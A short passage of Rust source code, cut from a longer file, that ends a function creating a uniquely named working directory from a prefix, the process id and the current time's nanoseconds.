    let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|x| x.subsec_nanos()).unwrap_or(0);
    d.push(format!("fuguquest_{}_{}", pid, nanos));
    std::fs::create_dir_all(&d).unwrap_or_else(|e| die(&format!("mkdir workdir: {}", e)));
    d
}
